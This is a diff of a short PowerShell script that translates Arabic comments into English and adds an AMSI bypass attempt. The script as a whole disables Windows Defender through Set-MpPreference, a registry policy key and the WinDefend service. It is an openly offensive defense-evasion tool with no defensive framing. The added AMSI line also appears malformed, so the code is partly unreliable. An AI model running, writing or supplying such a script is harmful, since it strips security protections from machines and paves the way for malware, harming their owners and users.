@@ -1,16 +1,20 @@
-# تعطيل الحماية في الوقت الحقيقي
+# AMSI Bypass
+$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed'
+If (-Not $s) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed' = $true}
+
+# Disable Windows Defender in real-time
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# تعطيل الحماية السحابية وإرسال العينات تلقائيًا
+# Disable Windows Defender cloud protection and sample submission
 Set-MpPreference -MAPSReporting Disabled
 Set-MpPreference -SubmitSamplesConsent 2
 
-# تعطيل Windows Defender من الريجستري
+# Disable Windows Defender via Registry
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
 
-# إيقاف خدمة Windows Defender وتعطيلها
+# Stop and disable Windows Defender service
 Stop-Service -Name WinDefend -Force
 Set-Service -Name WinDefend -StartupType Disabled
 
-# تأكيد التنفيذ
+# Confirmation message
 Write-Host "Windows Defender has been disabled."
